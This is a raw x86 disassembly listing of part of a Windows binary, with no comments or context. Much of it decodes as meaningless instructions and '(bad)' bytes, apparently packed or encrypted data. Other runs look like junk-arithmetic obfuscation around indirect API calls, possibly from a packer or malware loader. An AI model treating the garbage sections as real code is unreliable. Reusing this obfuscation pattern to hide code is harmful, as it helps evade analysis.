  41b840:	neg    DWORD PTR [ecx]
  41b842:	mov    ds:0xfcb47a5c,eax
  41b847:	cmp    esi,esi
  41b849:	pop    edx
  41b84a:	mov    ds:0xa8bc2c3b,al
  41b84f:	lahf   
  41b850:	pop    ebx
  41b851:	cli    
  41b852:	test   eax,0x6445db5e
  41b857:	loopne 0x41b89a
  41b859:	in     al,0x91
  41b85b:	clc    
  41b85c:	jnp    0x41b860
  41b85e:	jg     0x41b819
  41b860:	js     0x41b8c5
  41b862:	in     eax,dx
  41b863:	sub    al,0x52
  41b865:	cmp    bl,BYTE PTR [eax+0x524ab12d]
  41b86b:	pop    edx
  41b86c:	lahf   
  41b86d:	out    dx,eax
  41b86e:	xchg   ebx,eax
  41b86f:	mov    bh,0x6
  41b871:	lods   eax,DWORD PTR ds:[esi]
  41b872:	sub    eax,0x2a1f3497
  41b877:	in     al,0xc8
  41b879:	push   ebx
  41b87a:	or     ch,BYTE PTR [ecx-0xc]
  41b87d:	push   edi
  41b87e:	mov    edx,0x4ba7e88f
  41b883:	into   
  41b884:	jg     0x41b80a
  41b886:	mov    dh,0xed
  41b888:	push   es
  41b889:	in     eax,0x8d
  41b88b:	mov    eax,ds:0x9509ce05
  41b890:	sub    edx,DWORD PTR [ecx+0x16]
  41b893:	push   ebx
  41b894:	les    edx,FWORD PTR fs:[edx-0x59b7ffc3]
  41b89b:	jbe    0x41b82b
  41b89d:	mov    bl,0x4d
  41b89f:	inc    ecx
  41b8a0:	jno    0x41b8a4
  41b8a2:	arpl   WORD PTR [edi+0x40],di
  41b8a5:	scas   eax,DWORD PTR es:[edi]
  41b8a6:	icebp  
  41b8a7:	xlat   BYTE PTR ds:[ebx]
  41b8a8:	fiadd  DWORD PTR [edi-0x69]
  41b8ab:	out    0x35,eax
  41b8ad:	add    eax,0xc2256320
  41b8b2:	shrd   DWORD PTR [esp+edi*2],ebx,cl
  41b8b6:	mov    eax,0x5919867e
  41b8bb:	add    edi,DWORD PTR [eax-0x356184da]
  41b8c1:	je     0x41b85d
  41b8c3:	push   esp
  41b8c4:	into   
  41b8c5:	add    edi,ebx
  41b8c7:	mov    edx,DWORD PTR [eax+0x70b954a]
  41b8cd:	push   0x7ef6c522
  41b8d2:	out    dx,al
  41b8d3:	(bad)  
  41b8d4:	(bad)  
  41b8d5:	push   eax
  41b8d6:	(bad)
  41b8d9:	scas   eax,DWORD PTR es:[edi]
  41b8da:	sub    DWORD PTR [ebp-0x61],edx
  41b8dd:	or     ch,BYTE PTR [eax+0x5dd697c2]
  41b8e3:	adc    dl,dh
  41b8e5:	cwde   
  41b8e6:	cmp    esi,DWORD PTR [ebp+0x392cd025]
  41b8ec:	(bad)  [esp+esi*8-0x6852a7c3]
  41b8f3:	jns    0x41b8a9
  41b8f5:	fcmovb st,st(5)
  41b8f7:	mul    ah
  41b8f9:	mov    DWORD PTR [esi+ebp*1],esp
  41b8fc:	pop    es
  41b8fd:	or     ax,si
  41b900:	jo     0x41b910
  41b902:	and    BYTE PTR [edx],bl
  41b904:	mov    edx,0x9e45637d
  41b909:	inc    ebp
  41b90a:	loop   0x41b934
  41b90c:	push   esp
  41b90d:	dec    esi
  41b90e:	or     BYTE PTR [edi+eax*4-0xbcd47c7],bl
  41b915:	push   eax
  41b916:	xchg   ebx,eax
  41b917:	ret    0xd44c
  41b91a:	push   ebx
  41b91b:	test   al,0xd9
  41b91d:	sub    al,0xb8
  41b91f:	cli    
  41b920:	shl    DWORD PTR [edx+0x1c],cl
  41b923:	adc    BYTE PTR [eax*8-0x857659e],bl
  41b92a:	xchg   DWORD PTR [eax],esi
  41b92c:	xor    DWORD PTR [eax-0x74db32a3],esi
  41b932:	push   0xfffffffa
  41b934:	not    DWORD PTR [esi-0x66]
  41b937:	or     edi,DWORD PTR [edi]
  41b939:	pop    es
  41b93a:	call   0x56ce:0x39cf1191
  41b941:	jmp    0xfa451b68
  41b946:	and    BYTE PTR [ebx-0x6c],bh
  41b949:	cmp    ebx,esi
  41b94b:	mov    ebx,0x3653e28
  41b950:	aam    0x9f
  41b952:	and    ecx,DWORD PTR [esi+0x59]
  41b955:	arpl   WORD PTR [esi-0x174d3091],bp
  41b95b:	push   es
  41b95c:	lods   al,BYTE PTR ds:[esi]
  41b95d:	in     al,0x42
  41b95f:	jmp    0x41b901
  41b961:	xor    ch,dh
  41b963:	cs aad 0x19
  41b966:	mov    eax,0x518fe4e4
  41b96b:	stos   DWORD PTR es:[edi],eax
  41b96c:	pop    es
  41b96d:	lods   al,BYTE PTR ds:[esi]
  41b96e:	sbb    al,0xad
  41b970:	cmp    al,BYTE PTR [edx]
  41b972:	es push edx
  41b974:	xor    ecx,DWORD PTR [eax+0x55ccdb66]
  41b97a:	add    eax,0x25b595d9
  41b97f:	xlat   BYTE PTR ds:[ebx]
  41b980:	arpl   WORD PTR [eax+0x65d836d3],dx
  41b986:	les    esp,FWORD PTR [esi-0x46]
  41b989:	rcl    BYTE PTR [edx-0x14],0x94
  41b98d:	ins    BYTE PTR es:[edi],dx
  41b98e:	dec    edi
  41b98f:	imul   ebx,DWORD PTR [ebx],0x74
  41b992:	cmc    
  41b993:	dec    eax
  41b994:	loopne 0x41ba12
  41b996:	push   esi
  41b997:	fcmovb st,st(7)
  41b999:	fwait
  41b99a:	and    ebp,ebp
  41b99c:	test   DWORD PTR [eax+0x69],esi
  41b99f:	shld   DWORD PTR [ebx],esi,0xb
  41b9a3:	mov    ebx,0xf4384b26
  41b9a8:	adc    ebp,eax
  41b9aa:	add    BYTE PTR [ecx+0x35],ah
  41b9ad:	cmp    ebx,DWORD PTR ds:0xf1e13444
  41b9b3:	mov    ecx,0xf27f958
  41b9b8:	adc    DWORD PTR [edi+0x2e],ecx
  41b9bb:	shl    ebx,0xf2
  41b9be:	push   ebp
  41b9bf:	fcmovb st,st(2)
  41b9c1:	pop    ss
  41b9c2:	jnp    0x41ba2f
  41b9c4:	sar    BYTE PTR [ecx+ebp*4-0x3b],0xda
  41b9c9:	add    edi,DWORD PTR [esi+0x9]
  41b9cc:	mov    DWORD PTR [eax+esi*4-0xd],ebp
  41b9d0:	or     al,0xc1
  41b9d2:	or     BYTE PTR [ebp+0x4f675aa5],bl
  41b9d8:	inc    edx
  41b9d9:	mov    al,ds:0x4c9513a
  41b9de:	loop   0x41ba36
  41b9e0:	push   ecx
  41b9e1:	add    ch,ch
  41b9e3:	mov    bl,0xd
  41b9e5:	scas   eax,DWORD PTR es:[edi]
  41b9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9e8:	fdivr  st(0),st
  41b9ea:	inc    eax
  41b9eb:	mov    edx,0x96b79fce
  41b9f0:	cld    
  41b9f1:	jge    0x41ba6b
  41b9f3:	add    DWORD PTR [esi-0x58812c5b],0xffffffbc
  41b9fa:	sub    bl,BYTE PTR [ebx+0x68]
  41b9fd:	inc    ecx
  41b9fe:	test   DWORD PTR [ecx+eax*8],eax
  41ba01:	mov    dl,0xee
  41ba03:	jge    0x41ba60
  41ba05:	sub    BYTE PTR [edx+0x51],dl
  41ba08:	sysenter 
  41ba0a:	jb     0x41ba3e
  41ba0c:	add    al,BYTE PTR [eax-0x5c95af6f]
  41ba12:	dec    esi
  41ba13:	xchg   esp,eax
  41ba14:	pop    ecx
  41ba15:	ja     0x41ba26
  41ba17:	or     edi,ecx
  41ba19:	data16 jg 0x41ba7e
  41ba1c:	lock (bad) 
  41ba1e:	sbb    al,0xcc
  41ba20:	(bad)  
  41ba21:	mov    ecx,DWORD PTR [ebp-0x28]
  41ba24:	adc    DWORD PTR ds:0x422976,0x422996
  41ba2e:	mov    esi,DWORD PTR [ebp-0x24]
  41ba31:	xor    eax,0x2340
  41ba36:	and    eax,ecx
  41ba38:	sbb    DWORD PTR ds:0x4228f6,0x422972
  41ba42:	xor    edx,0x452
  41ba48:	and    edx,esi
  41ba4a:	cmp    DWORD PTR ds:0x42298a,0x0
  41ba51:	mov    esi,DWORD PTR ds:0x4228da
  41ba57:	mov    esi,0x28ad
  41ba5c:	jmp    0x41ba97
  41ba61:	mov    DWORD PTR ds:0x422952,0x4940
  41ba6b:	ja     0x41ba89
  41ba71:	push   DWORD PTR [ebp-0x24]
  41ba74:	push   DWORD PTR [ebp-0x28]
  41ba77:	call   DWORD PTR ds:0x42a17c
  41ba7d:	sub    ecx,DWORD PTR ds:0x4228fa
  41ba83:	xor    DWORD PTR ds:0x4228ee,edi
  41ba89:	adc    DWORD PTR ds:0x4228fa,0x422972
  41ba93:	and    ecx,esi
  41ba95:	adc    ecx,esi
  41ba97:	and    eax,0x3741
  41ba9c:	mov    DWORD PTR [ebp-0x10],eax
  41ba9f:	and    edx,0x445b
  41baa5:	cmp    DWORD PTR ds:0x4229b6,0x0
  41baac:	mov    ecx,DWORD PTR ds:0x42293e
  41bab2:	mov    DWORD PTR ds:0x4229ce,ebx
  41bab8:	mov    esi,0x2c04
  41babd:	jmp    0x41bb16
  41bac2:	mov    DWORD PTR ds:0x42293a,edi
  41bac8:	jle    0x41bafe
  41bace:	push   0x3ca9
  41bad3:	call   DWORD PTR ds:0x42a058
  41bad9:	movzx  esi,WORD PTR ds:0x4228b2
  41bae0:	sbb    esi,DWORD PTR ds:0x4228fa
  41bae6:	mov    DWORD PTR ds:0x4228b2,esi
  41baec:	and    DWORD PTR ds:0x4228b2,0x689
  41baf6:	sub    ecx,esi
  41baf8:	sbb    DWORD PTR ds:0x4228de,edi
  41bafe:	sbb    DWORD PTR ds:0x4228f2,ecx
  41bb04:	mov    ecx,DWORD PTR ds:0x42295e
  41bb0a:	or     DWORD PTR ds:0x4228fe,ecx
  41bb10:	add    DWORD PTR ds:0x422992,ecx
  41bb16:	mov    DWORD PTR [ebp-0xc],edx
  41bb19:	mov    DWORD PTR [ebp-0x20],0x5770
  41bb20:	mov    eax,ds:0x422a7a
  41bb25:	mov    ecx,DWORD PTR ds:0x422b0e
  41bb2b:	sub    eax,ecx
  41bb2d:	and    eax,DWORD PTR [eax+ecx*1]
  41bb30:	mov    DWORD PTR [ebp-0x1c],0x18fc
  41bb37:	jmp    0x41bdea
  41bb3c:	mov    dh,0xdf
  41bb3e:	or     DWORD PTR [ecx-0x48],edx
  41bb41:	and    BYTE PTR [esi],ch
  41bb43:	pop    eax
  41bb44:	(bad)
  41bb48:	jp     0x41baf2
  41bb4a:	push   edx
  41bb4b:	mov    dl,0xdc
  41bb4d:	add    eax,0xaeb160c
  41bb52:	push   ss
  41bb53:	push   ss
  41bb54:	test   al,0x8d
  41bb56:	fsubrp st(7),st
  41bb58:	xor    DWORD PTR [ecx+edx*4-0x3f],esp
  41bb5c:	(bad)  
  41bb5d:	mov    dl,0x9a
  41bb5f:	test   BYTE PTR [edx*2-0x4d1a4ccb],ah
  41bb66:	add    eax,0xbcf9eb2f
  41bb6b:	nop
  41bb6c:	cmp    DWORD PTR [ebx],edx
  41bb6e:	mov    ds:0x46ed08cd,al
  41bb73:	ss jmp 0x606a3e48
  41bb79:	out    0x5d,al
  41bb7b:	sub    eax,0x86568614
  41bb80:	adc    eax,0x383accbf
  41bb85:	mov    dh,0x37
  41bb87:	outs   dx,DWORD PTR ds:[esi]
  41bb88:	adc    eax,0x9ee378b3
  41bb8d:	adc    BYTE PTR [eax+0x7c35bf28],ah
  41bb93:	push   ss
  41bb94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb95:	sahf   
  41bb96:	loope  0x41bb47
  41bb98:	shl    BYTE PTR [edx+0x139b7093],1
  41bb9e:	push   cs
  41bb9f:	mov    eax,DWORD PTR [esp+eax*4+0x70784023]
  41bba6:	fwait
  41bba7:	push   ebx
  41bba8:	(bad)  
  41bba9:	mov    edx,0xd51d6cd6
  41bbae:	xchg   esi,eax
  41bbaf:	lea    ecx,[esi+ecx*4+0x5b]
  41bbb3:	fmul   QWORD PTR [edx]
  41bbb5:	adc    ecx,edx
  41bbb7:	mov    edx,0x4462c475
  41bbbc:	mov    eax,0xfc0160bb
  41bbc1:	fidivr DWORD PTR [esi+edi*2-0xb79b459]
  41bbc8:	pop    esi
  41bbc9:	jns    0x41bb61
  41bbcb:	ret    
  41bbcc:	mov    esi,0x5aec67eb
  41bbd1:	sub    ah,BYTE PTR [ebp+0x0]
  41bbd4:	les    esp,FWORD PTR [esi+0x63733a3]
  41bbda:	retf   
  41bbdb:	out    dx,al
  41bbdc:	aad    0xd9
  41bbde:	pxor   mm4,QWORD PTR [edi-0x43]
  41bbe2:	out    dx,eax
  41bbe3:	inc    eax
  41bbe4:	pop    ss
  41bbe5:	dec    esi
  41bbe6:	sub    ah,BYTE PTR [eax+eiz*2-0x2]
  41bbea:	xor    al,0xe5
  41bbec:	or     al,BYTE PTR [esi]
  41bbee:	in     eax,0x57
  41bbf0:	jnp    0x41bbe1
  41bbf2:	inc    esp
  41bbf3:	mov    ch,0xd0
  41bbf5:	iret   
  41bbf6:	loop   0x41bbde
  41bbf8:	push   0x13471af3
  41bbfd:	sub    eax,0x59150617
  41bc02:	pop    esp
  41bc03:	xchg   esi,eax
  41bc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc05:	jbe    0x41bc7e
  41bc07:	and    dh,BYTE PTR [ebp-0x27]
  41bc0a:	xchg   ecx,eax
  41bc0b:	shl    BYTE PTR [ecx-0xd3098b2],1
  41bc11:	mov    ebp,0x291821b2
  41bc16:	dec    ebp
  41bc17:	fnsave [ebx]
  41bc19:	lods   al,BYTE PTR ds:[esi]
  41bc1a:	push   edi
  41bc1b:	outs   dx,DWORD PTR ds:[esi]
  41bc1c:	mov    BYTE PTR [edx],dl
  41bc1e:	mov    dh,0x44
  41bc20:	lods   al,BYTE PTR ds:[esi]
  41bc21:	xor    DWORD PTR [esi-0x44],ebx
  41bc24:	iret   
  41bc25:	sub    DWORD PTR [esi],ebp
  41bc27:	lods   al,BYTE PTR ds:[esi]
  41bc28:	fbstp  TBYTE PTR [ecx]
  41bc2a:	nop    DWORD PTR fs:[esi+edi*2+0x7b]
  41bc30:	mov    ?,WORD PTR [edi+0x1d381413]
  41bc36:	outs   dx,BYTE PTR ds:[esi]
  41bc37:	int3   
  41bc38:	jmp    0xd70530fc
  41bc3d:	(bad)  
  41bc3e:	push   ecx
  41bc3f:	sub    eax,0xefaab004
  41bc44:	in     eax,dx
  41bc45:	adc    edi,DWORD PTR [edx-0x8576977]
  41bc4b:	stos   BYTE PTR es:[edi],al
  41bc4c:	push   ecx
  41bc4d:	lods   eax,DWORD PTR ds:[esi]
  41bc4e:	loope  0x41bc4a
  41bc50:	adc    al,dl
  41bc52:	sub    dl,BYTE PTR [edx+ecx*2+0x624ab4d7]
  41bc59:	shl    BYTE PTR [ecx-0x76],cl
  41bc5c:	add    DWORD PTR [edi],ebp
  41bc5e:	outs   dx,DWORD PTR ds:[esi]
  41bc5f:	ret    
  41bc60:	xchg   ebx,eax
  41bc61:	jmp    0x41bc2f
  41bc63:	mov    ds:0x1416d837,eax
  41bc68:	or     bl,ch
  41bc6a:	mov    dh,0xcd
  41bc6c:	adc    ebx,ebp
  41bc6e:	inc    ebx
  41bc6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc70:	test   DWORD PTR [edi],ebp
  41bc72:	mov    ds,WORD PTR [eax]
  41bc74:	sbb    ah,BYTE PTR [edx+0x10]
  41bc77:	addr16 push es
  41bc79:	jno    0x41bc78
  41bc7b:	scas   al,BYTE PTR es:[edi]
  41bc7c:	jg     0x41bcca
  41bc7e:	fcomp  DWORD PTR [edi-0x74]
  41bc81:	inc    ebx
  41bc82:	mov    esi,0x238cc035
  41bc87:	nop
  41bc88:	js     0x41bcc5
  41bc8a:	mov    ds:0x74f71dca,al
  41bc8f:	adc    BYTE PTR [ecx+ebp*8-0x1cd973f9],cl
  41bc96:	repnz sbb BYTE PTR ds:0xe4214a9e,ch
  41bc9d:	xchg   ebp,eax
  41bc9e:	sub    BYTE PTR [eax],dh
  41bca0:	xchg   edx,eax
  41bca1:	leave  
  41bca2:	(bad)  
  41bca3:	retf   0x14b6
  41bca6:	in     al,0x40
  41bca8:	inc    ebx
  41bca9:	addr16 pop es
  41bcab:	bound  esi,QWORD PTR [esi]
  41bcad:	mul    BYTE PTR [eiz*1+0x681b0ab6]
  41bcb4:	xor    BYTE PTR [ebp+eiz*4-0x3a],dh
  41bcb8:	push   ds
  41bcb9:	dec    ecx
  41bcba:	lahf   
  41bcbb:	stos   BYTE PTR es:[edi],al
  41bcbc:	out    0xce,al
  41bcbe:	jmp    0x41bc6a
  41bcc0:	(bad)
  41bcc3:	inc    DWORD PTR [edx]
  41bcc5:	imul   ecx,DWORD PTR [esi-0x47ec460c],0xffffffcc
  41bccc:	in     eax,dx
  41bccd:	or     eax,esi
  41bccf:	scas   al,BYTE PTR es:[edi]
  41bcd0:	rcr    BYTE PTR [ebp+0x4d318430],0xde
  41bcd7:	(bad)  [edx+eax*1-0x4b263aa0]
  41bcde:	fs stos BYTE PTR es:[edi],al
  41bce0:	jns    0x41bc96
  41bce2:	and    eax,ebx
  41bce4:	inc    esp
  41bce5:	(bad)  
  41bce6:	aam    0x3
  41bce8:	xor    BYTE PTR [ebx-0x60],0xb
  41bcec:	dec    ebx
  41bced:	retf   0x2f72
  41bcf0:	js     0x41bd0f
  41bcf2:	addr16 clc 
  41bcf4:	(bad)  
  41bcf5:	enter  0xa363,0x35
  41bcf9:	je     0x41bd08
  41bcfb:	retf   0xde85
  41bcfe:	retf   
  41bcff:	or     eax,0x21315760
  41bd04:	push   cs
  41bd05:	add    BYTE PTR [ebx+0xf],bh
  41bd08:	jnp    0x41bd7a
  41bd0a:	popa   
  41bd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd0c:	jg     0x41bd10
  41bd0e:	dec    ebp
  41bd0f:	(bad)  
  41bd10:	std    
  41bd11:	iret   
  41bd12:	sbb    DWORD PTR [eax],edi
  41bd14:	dec    DWORD PTR [ebx]
  41bd16:	xor    al,0xc5
  41bd18:	icebp  
  41bd19:	in     al,0xb1
  41bd1b:	and    dl,BYTE PTR [ebx]
  41bd1d:	bound  edi,QWORD PTR [edi]
  41bd1f:	xor    BYTE PTR fs:[esi+eax*1],cl
  41bd23:	inc    BYTE PTR ds:0x4ec1b6ed
  41bd29:	(bad)  
  41bd2a:	retf   
  41bd2b:	pop    edi
  41bd2c:	sbb    eax,0x31aae4cf
  41bd31:	out    0xc7,al
  41bd33:	jmp    0x758b825a
  41bd38:	lahf   
  41bd39:	fs xor BYTE PTR es:[ecx+eax*8],0x9b
  41bd3f:	adc    eax,0xb41c76b
  41bd44:	sbb    al,0xa
  41bd46:	lahf   
  41bd47:	inc    esp
  41bd48:	push   ss
  41bd49:	jnp    0x41bd47
  41bd4b:	dec    esi
  41bd4c:	stc    
  41bd4d:	pop    ss
  41bd4e:	sbb    ebx,DWORD PTR [esi]
  41bd50:	push   0xffffffc8
  41bd52:	dec    edi
  41bd53:	div    DWORD PTR [ebx+0x15]
  41bd56:	mov    eax,0xa4d03729
  41bd5b:	loopne 0x41bd56
  41bd5d:	sar    BYTE PTR [esi+0x22],1
  41bd60:	push   0x5757fe4
  41bd65:	pop    ss
  41bd66:	or     al,BYTE PTR [edx-0x25]
  41bd69:	in     al,0xc
  41bd6b:	mov    dh,0x35
  41bd6d:	adc    eax,0x70bcd80d
  41bd72:	adc    BYTE PTR [edx+0x59044185],cl
  41bd78:	sub    bl,BYTE PTR [esi]
  41bd7a:	aaa    
  41bd7b:	dec    ecx
  41bd7c:	jns    0x41bdf1
  41bd7e:	or     eax,0x278c109e
  41bd83:	sub    BYTE PTR [ebx+0x3ba92927],ch
  41bd89:	jle    0x41bd7c
  41bd8b:	int3   
  41bd8c:	adc    eax,0xebfc052c
  41bd91:	cmp    DWORD PTR [ebp-0x49],edx
  41bd94:	cmp    BYTE PTR [eax+0x4a],bl
  41bd97:	arpl   WORD PTR [esp+eiz*4],bx
  41bd9a:	and    DWORD PTR [esi-0x53],0xf
  41bd9e:	ins    DWORD PTR es:[edi],dx
  41bd9f:	ins    BYTE PTR es:[edi],dx
  41bda0:	into   
  41bda1:	jg     0x41bd42
  41bda3:	sbb    ch,ah
  41bda5:	jmp    0x786f3280
  41bdaa:	push   0x83a6ba59
  41bdaf:	push   ebx
  41bdb0:	sar    DWORD PTR [eax-0x527155bd],cl
  41bdb6:	(bad)
  41bdb9:	loopne 0x41bd41
  41bdbb:	daa    
  41bdbc:	push   es
  41bdbd:	cld    
  41bdbe:	mov    eax,DWORD PTR [esp+ebp*2-0x45]
  41bdc2:	push   cs
  41bdc3:	and    DWORD PTR [ebx-0x3a7adb68],ebx
  41bdc9:	and    eax,0x47c6fe0a
  41bdce:	and    al,0x69
  41bdd0:	jns    0x41bdb3
  41bdd2:	aad    0xe9
  41bdd4:	aad    0x47
  41bdd6:	push   esp
  41bdd7:	push   cs
  41bdd8:	out    dx,al
  41bdd9:	cmc    
  41bdda:	pushf  
  41bddb:	mov    ah,0x4a
  41bddd:	stos   DWORD PTR es:[edi],eax
  41bdde:	(bad)  
  41bddf:	mov    dl,0x4b
  41bde1:	adc    DWORD PTR [ecx-0x34aa00ea],esi
  41bde7:	(bad)  
  41bde8:	mov    eax,DWORD PTR ds:0x1bd845c7
  41bdee:	adc    eax,0xca130000
  41bdf3:	mov    DWORD PTR [ebp-0x24],0x1c21
  41bdfa:	add    DWORD PTR ds:0x42293a,0x7032
  41be04:	mov    eax,DWORD PTR [ebp-0x28]
  41be07:	mov    DWORD PTR ds:0x4228d6,0x3603
  41be11:	mov    ecx,DWORD PTR [ebp-0x24]
  41be14:	xor    edx,DWORD PTR ds:0x42295a
  41be1a:	mov    edx,DWORD PTR [ebp-0x20]
  41be1d:	and    esi,DWORD PTR ds:0x422932
  41be23:	mov    esi,DWORD PTR [ebp-0x1c]
  41be26:	add    eax,0x12fa
  41be2b:	push   esi
  41be2c:	adc    ecx,0x31c
  41be32:	sbb    DWORD PTR ds:0x422992,0x422932
  41be3c:	push   edx
  41be3d:	neg    DWORD PTR ds:0x4228ae
  41be43:	and    ecx,0x2420
  41be49:	or     DWORD PTR ds:0x422896,0x6744
  41be53:	and    eax,0x7f7f
  41be58:	sub    DWORD PTR ds:0x42292e,0x4229a6
  41be62:	push   ecx
  41be63:	push   eax
  41be64:	or     DWORD PTR ds:0x422932,0x422986
  41be6e:	call   0x41e026
  41be73:	mov    DWORD PTR ds:0x4228d2,0x50ed
  41be7d:	mov    esi,DWORD PTR [ebp-0x10]
  41be80:	mov    ecx,0x61bf
  41be85:	mov    ecx,DWORD PTR [ebp-0xc]
  41be88:	cmp    ecx,edx
  41be8a:	ja     0x41c1dd
  41be90:	mov    DWORD PTR ds:0x4229aa,0x308e
  41be9a:	jb     0x41beb2
  41bea0:	cmp    esi,eax
  41bea2:	mov    DWORD PTR ds:0x4228d2,0x64bb
  41beac:	jae    0x41c1dd
  41beb2:	adc    ecx,DWORD PTR ds:0x4229ce
  41beb8:	mov    DWORD PTR [ebp-0x10],0x6155
  41bebf:	mov    DWORD PTR [ebp-0xc],0x201
  41bec6:	sub    ecx,DWORD PTR ds:0x4228be
  41becc:	mov    DWORD PTR [ebp-0x20],0x44e0
  41bed3:	cmp    DWORD PTR ds:0x4228ca,0x0
  41beda:	mov    edx,0x767c
  41bedf:	not    esi
  41bee1:	jmp    0x41bf4e
  41bee6:	not    edx
  41bee8:	jbe    0x41bf29
  41beee:	push   DWORD PTR [ebp-0x18]
  41bef1:	push   0x8f12
  41bef6:	push   DWORD PTR [ebp-0x28]
  41bef9:	push   0x243c
  41befe:	push   0x73f8
  41bf03:	push   0x4227d9
  41bf08:	push   0x400000
  41bf0d:	call   DWORD PTR ds:0x42a030
  41bf13:	sub    DWORD PTR ds:0x4228be,ebx
  41bf19:	sub    ecx,DWORD PTR ds:0x422986
  41bf1f:	sbb    DWORD PTR ds:0x42292e,0x3fb0
  41bf29:	xor    DWORD PTR ds:0x4229c6,0x7a44
  41bf33:	add    DWORD PTR ds:0x4228de,0x618
  41bf3d:	mov    edx,DWORD PTR ds:0x422aba
  41bf43:	mov    esi,DWORD PTR ds:0x422b16
  41bf49:	sub    esi,edx
  41bf4b:	add    edx,DWORD PTR [edx+esi*1]
  41bf4e:	mov    DWORD PTR [ebp-0x1c],0x5ee2
  41bf55:	xor    eax,0x576f
  41bf5a:	mov    DWORD PTR [ebp-0x28],0x1aff
  41bf61:	mov    DWORD PTR [ebp-0x24],0xee6
  41bf68:	mov    eax,DWORD PTR [ebp-0x28]
  41bf6b:	cmp    DWORD PTR ds:0x422982,0x0
  41bf72:	mov    DWORD PTR ds:0x42292e,0x189d
  41bf7c:	mov    DWORD PTR ds:0x4229c6,edx
  41bf82:	jmp    0x41bfcc
  41bf87:	mov    DWORD PTR ds:0x4229d2,ebx
  41bf8d:	mov    DWORD PTR ds:0x42294e,edx
  41bf93:	jl     0x41bfb0
  41bf99:	push   0x3bbb
  41bf9e:	call   DWORD PTR ds:0x42a034
  41bfa4:	sub    ecx,DWORD PTR ds:0x42293a
  41bfaa:	sbb    DWORD PTR ds:0x4229b2,ebx
  41bfb0:	or     ecx,DWORD PTR ds:0x4229be
  41bfb6:	and    DWORD PTR ds:0x4228ea,0x3818
  41bfc0:	sbb    DWORD PTR ds:0x42296e,0x49eb
  41bfca:	adc    ecx,ecx
  41bfcc:	mov    ecx,DWORD PTR [ebp-0x24]
  41bfcf:	mov    edx,DWORD PTR [ebp-0x20]
  41bfd2:	mov    esi,DWORD PTR [ebp-0x1c]
  41bfd5:	add    eax,edx
  41bfd7:	mov    edx,DWORD PTR [ebp-0x10]
  41bfda:	adc    ecx,esi
  41bfdc:	mov    esi,DWORD PTR [ebp-0xc]
  41bfdf:	or     ecx,0x142d
  41bfe5:	or     eax,0x26da
  41bfea:	add    eax,0x4b35
  41bfef:	adc    ecx,0x509e
  41bff5:	xor    eax,edx
  41bff7:	xor    ecx,esi
  41bff9:	add    eax,0x5ec6
  41bffe:	mov    DWORD PTR [ebp-0x40],eax
  41c001:	adc    ecx,0x3421
  41c007:	mov    DWORD PTR [ebp-0x3c],ecx
  41c00a:	mov    DWORD PTR [ebp-0x38],0x4edc
  41c011:	mov    DWORD PTR [ebp-0x34],0x733f
  41c018:	mov    DWORD PTR [ebp-0x30],0x58e
  41c01f:	mov    DWORD PTR [ebp-0x2c],0x43b2
  41c026:	mov    DWORD PTR [ebp-0x10],0x69531b9
  41c02d:	mov    DWORD PTR [ebp-0xc],0x0
  41c034:	mov    DWORD PTR [ebp-0x20],0x55d
  41c03b:	mov    DWORD PTR [ebp-0x1c],0xa30
  41c042:	mov    DWORD PTR [ebp-0x28],0x1f62
  41c049:	mov    DWORD PTR [ebp-0x24],0x677b
  41c050:	mov    eax,DWORD PTR [ebp-0x28]
  41c053:	mov    ecx,DWORD PTR [ebp-0x24]
  41c056:	mov    edx,DWORD PTR [ebp-0x20]
  41c059:	mov    esi,DWORD PTR [ebp-0x1c]
  41c05c:	and    eax,edx
  41c05e:	mov    edx,DWORD PTR [ebp-0x10]
  41c061:	and    ecx,esi
  41c063:	mov    esi,DWORD PTR [ebp-0xc]
  41c066:	push   esi
  41c067:	push   edx
  41c068:	push   ecx
  41c069:	push   eax
  41c06a:	call   0x421b6b
  41c06f:	push   0x353c
  41c074:	push   0x45cf
  41c079:	push   edx
  41c07a:	push   eax
  41c07b:	call   0x41e026
  41c080:	mov    ecx,DWORD PTR [ebp-0x30]
  41c083:	mov    esi,DWORD PTR [ebp-0x2c]
  41c086:	add    eax,ecx
  41c088:	mov    ecx,DWORD PTR [ebp-0x38]
  41c08b:	adc    edx,esi
  41c08d:	mov    esi,DWORD PTR [ebp-0x34]
  41c090:	and    eax,ecx
  41c092:	mov    ecx,DWORD PTR [ebp-0x40]
  41c095:	and    edx,esi
  41c097:	mov    esi,DWORD PTR [ebp-0x3c]
  41c09a:	cmp    ecx,eax
  41c09c:	jne    0x41c0aa
  41c0a2:	cmp    esi,edx
  41c0a4:	je     0x41c1dd
  41c0aa:	mov    DWORD PTR [ebp-0x40],0x5f3f50d6
  41c0b1:	mov    DWORD PTR [ebp-0x3c],0x1
  41c0b8:	mov    eax,DWORD PTR [ebp-0x40]
  41c0bb:	mov    ecx,DWORD PTR [ebp-0x3c]
  41c0be:	push   ecx
  41c0bf:	push   eax
  41c0c0:	push   0x7850
  41c0c5:	push   0x5329
  41c0ca:	call   0x421b6b
  41c0cf:	xor    eax,0x100
  41c0d4:	xor    edx,0x201
  41c0da:	or     eax,0x76ef
  41c0df:	or     edx,0x5df4
  41c0e5:	mov    DWORD PTR [ebp-0x40],eax
  41c0e8:	mov    DWORD PTR [ebp-0x3c],edx
  41c0eb:	mov    eax,ds:0x42247c
  41c0f0:	cmp    eax,0x7cd80819
  41c0f5:	jne    0x41c1dd
  41c0fb:	mov    eax,DWORD PTR [ebp-0x18]
  41c0fe:	mov    ecx,DWORD PTR [ebp-0x14]
  41c101:	mov    edx,DWORD PTR [ebp-0x18]
  41c104:	mov    esi,DWORD PTR [ebp-0x14]
  41c107:	shrd   eax,ecx,0x2
  41c10b:	shl    edx,0x1e
  41c10e:	mov    edx,DWORD PTR ds:0x422268
  41c114:	mov    edx,DWORD PTR [edx+0x1a8]
  41c11a:	xor    esi,esi
  41c11c:	shr    ecx,0x2
  41c11f:	mov    ecx,0x2e9a655c
  41c124:	xor    eax,ecx
  41c126:	or     eax,esi
  41c128:	mov    DWORD PTR [edx],eax
  41c12a:	mov    eax,DWORD PTR [ebp-0x18]
  41c12d:	mov    edx,DWORD PTR [ebp-0x14]
  41c130:	shrd   eax,edx,0x2
